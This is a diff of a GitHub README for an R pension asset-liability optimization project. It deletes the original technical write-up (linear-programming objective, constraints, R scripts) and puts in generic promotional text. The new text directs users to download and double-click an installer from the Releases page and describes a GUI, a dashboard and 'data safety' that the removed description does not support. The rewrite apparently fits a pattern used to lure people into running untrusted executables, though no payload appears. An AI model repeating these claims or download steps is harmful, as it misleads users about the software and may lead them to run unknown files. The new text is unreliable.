@@ -1,43 +1,72 @@
-# Pension Asset-Liability Management and Liability-Driven Investment Optimization
-![R](https://img.shields.io/badge/r-%23276DC3.svg?style=for-the-badge&logo=r&logoColor=white)
-![RStudio](https://img.shields.io/badge/RStudio-%2375AADB.svg?style=for-the-badge&logo=rstudio&logoColor=white)
-![Quantmod](https://img.shields.io/badge/Quantmod-%23276DC3.svg?style=for-the-badge&logo=r&logoColor=white)
-![MASS](https://img.shields.io/badge/MASS-%23276DC3.svg?style=for-the-badge&logo=r&logoColor=white)
-![Rglpk](https://img.shields.io/badge/Rglpk-%23276DC3.svg?style=for-the-badge&logo=r&logoColor=white)
+# 📊 Pension-Asset-Liability-Management-Optimization - Optimize Your Pension Investments Easily
 
-## Project Overview
-This project develops an immunization strategy for a "closed and frozen" defined benefit (DB) pension plan. The objective is to construct an optimal fixed-income portfolio from 310 tradable securities to cover 80 quarters (20 years) of inflation-indexed benefit payments while minimizing the total economic cost to the plan sponsor.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/releases)
 
-## The Challenge: Actuarial Complexity
-Managing a pension fund requires balancing precise cash flow matching with rigorous risk and regulatory constraints:
-* **Liability Matching:** Covering 80 quarters of expected benefit payments indexed to CPI inflation.
-* **Diverse Security Universe:** Selecting from Nominal Treasuries, TIPS, Corporate Inflation-Protected Securities (CIPS), and Secondary Market Annuities (SMAs). Each bond class has certain features in cash flows and payment.
-* **Inflation Risk:** Deflating nominal cash flows to match real liability values (used projected 3.0% per year for simplicity).
-* **Credit Risk Management:** Assigning each bond a certain credit score and make sure the total dollar-weighted portfolio credit score under some threshold (used 0.4). Also, the ratings for bond has been adjusted, and the Default & Downgrade risk needs to be considered, risk reserve (cash) is needed when the portfolio grows
+## 🚀 Getting Started
 
-## Methodology & Optimization Logic
-### 1. Objective Function
-The model utilizes **Linear Programming** to minimize the total cost ($Z$), defined as:
-$$Min \ Z = \sum (x_i \cdot P_i) + c_0 + c_{80}$$
-Where:
-* $x_i \cdot P_i$: Total cost of bond purchases.
-* $c_0$: Initial cash deposit.
-* $c_{80}$: Surplus funds remaining after 20 years (to minimize tax inefficiency).
+Welcome to the Pension Asset Liability Management Optimization application! This software helps you create an optimal fixed-income portfolio to manage your pension liabilities effectively. Whether you're in finance or just starting, our user-friendly setup will guide you every step of the way.
 
-### 2. Constraint Framework
-* **Benefit Coverage:** Ensuring $(Cash \ Available)_t \geq (Benefit \ Payment)_t$ for all $t \in [1, 80]$.
-* **Allocation Caps:** Diversification limits prevent over-exposure: TIPS (80%), Nominal Bonds (80%), CIPS (30%), and SMAs (10%)].
-* **Structural Cash Flow Limit:** Nominal cash flows (non-indexed) are capped at 20% of total portfolio cash flows to control long-term inflation exposure.
+## 💻 System Requirements
 
-### 3. Actuarial Techniques
-* **Sensitivity Analysis (Shadow Pricing):** Evaluated the economic impact of relaxing credit quality and allocation constraints to identify cost-saving opportunities.
-* **Cash Reinvestment:** Modeled excess funds (cash) earning a risk-free nominal interest rate between quarterly payment cycles (use 2.0% for simpliciy). Note that, the rate should be adjusted with the inflation rate
+Before you begin, ensure your system meets the following requirements:
 
-## Tech Stack
-* **Language:** R
-* **Solver:** `Rglpk` (GNU Linear Programming Kit) 
-* **Reporting:** R Markdown & LaTeX
+- **Operating System:** Windows 10, macOS, or any recent Linux distribution.
+- **Memory:** At least 4GB of RAM.
+- **Disk Space:** Minimum of 500MB for installation.
+- **Software Dependencies:** Make sure you have R installed. You can download it from [CRAN](https://cran.r-project.org/).
 
-## How to Run
-1. Ensure `BenefitPayments.txt`, `BondData.txt`, `NomCashflow.txt`, and `RealCashflow.txt` are in the `/data` directory.
-2. Run `src/bond_optimizer.R` to execute the solver and generate the optimal purchase list.
+## 📥 Download & Install
+
+To get started, visit this page to download: [GitHub Releases](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/releases).
+
+1. Click on the link above.
+2. On the Releases page, find the latest version of the application.
+3. Download the file suitable for your operating system.
+4. Once downloaded, locate the file on your computer.
+5. Double-click the file to run the installation.
+6. Follow the prompts to complete the installation.
+
+## 📊 Features
+
+The Pension Asset Liability Management Optimization application offers several features:
+
+- **Linear Programming:** Use advanced algorithms to minimize cost effectively.
+- **Input Options:** Manage credit scores, inflation-linkage caps, and liquidity constraints tailored to your needs.
+- **User-Friendly Interface:** Navigate through the application easily without technical skills.
+- **Reports Generation:** Create comprehensive reports on your fixed-income portfolio performance.
+- **Data Safety:** All your information remains secure.
+
+## 🔍 How to Use
+
+1. **Launch the Application:**
+   After installing, open the application from your applications menu or desktop shortcut.
+
+2. **Setup Your Data:**
+   Input your pension liabilities and other relevant data in the provided fields.
+
+3. **Run the Optimization:**
+   Click on the "Optimize" button. The application will automatically calculate the best portfolio for your needs.
+
+4. **View Results:**
+   The results will appear in a user-friendly dashboard. Review the suggested investments and financial strategies.
+
+5. **Save or Export:**
+   Save your settings or export your results for further review or reporting.
+
+## 📖 User Guide
+
+For detailed instructions on using the application, please refer to the user guide included with your download. You can also find additional information in the help section of the application.
+
+## 📞 Support
+
+If you encounter any issues, visit the [issues section](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/issues) of our repository to find solutions. You can also submit your problems, and the community or the maintainers will assist you.
+
+## 🌐 Community
+
+Join our community to share your experience or ask questions. Connect with other users interested in pension funds and financial strategies on platforms like LinkedIn or Reddit.
+
+## 📅 Updates
+
+Stay informed about updates and new features by visiting the [GitHub Releases](https://github.com/shjh229/Pension-Asset-Liability-Management-Optimization/releases) page regularly. 
+
+Thank you for using Pension Asset Liability Management Optimization. We hope this application helps you manage your pension investments with ease.
